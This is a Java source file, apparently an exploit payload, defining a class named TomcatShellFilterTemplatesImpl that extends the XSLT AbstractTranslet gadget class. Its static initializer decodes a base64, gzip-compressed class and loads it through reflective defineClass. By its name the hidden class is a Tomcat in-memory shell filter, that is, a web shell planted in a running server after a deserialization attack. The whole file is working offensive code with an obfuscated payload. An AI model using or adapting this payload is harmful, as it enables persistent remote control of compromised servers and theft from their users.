package com.xhstormr.app;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.zip.GZIPInputStream;

public class TomcatShellFilterTemplatesImpl extends AbstractTranslet {

    static {
        try {
            String base64 = "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";
            byte[] bytes = ungzip(Base64.getDecoder().decode(base64));
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            ((Class<?>) defineClass.invoke(classLoader, bytes, 0, bytes.length)).newInstance().equals(classLoader);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static byte[] ungzip(byte[] bytes) throws Exception {
        GZIPInputStream in = new GZIPInputStream(new ByteArrayInputStream(bytes));
        ByteArrayOutputStream out = new ByteArrayOutputStream();

        byte[] buf = new byte[2 * 1024];
        for (int read; (read = in.read(buf)) != -1; ) {
            out.write(buf, 0, read);
        }

        return out.toByteArray();
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
}
